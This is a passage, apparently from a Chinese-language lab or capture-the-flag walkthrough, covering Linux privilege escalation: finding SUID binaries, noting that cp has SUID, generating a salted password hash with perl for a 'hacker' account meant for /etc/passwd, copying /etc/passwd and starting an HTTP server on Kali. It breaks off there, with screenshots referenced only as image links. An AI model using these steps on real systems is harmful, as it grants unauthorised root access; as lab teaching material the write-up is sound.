### **3、系统提权**

#### **3.1 查找有suid的二进制文件**

```
find / -perm -u=s -type f 2>/dev/null
```

**发现cp有suid的权限**

![](../Images/6b63f8a1c3854c918e6bedff1e6ea166.png)

#### **3.2 需要在kali机器上创建一个用户保存到/etc/passwd**

密码为：hacker

```
perl -le 'print crypt("hacker","salt")'
```

使用perl生成加盐密码

![](../Images/ef9f14ed45943d712ef46e3e153c045d.png)

创建账号为hacker

```

cp /etc/passwd ./
```

![](../Images/8ed9253048683fb2fb332af1be2b50bd.png)

在kali上开启http服务

![](../Images/8337b7a77a1bcea997ca7d5917cd23e4.png)
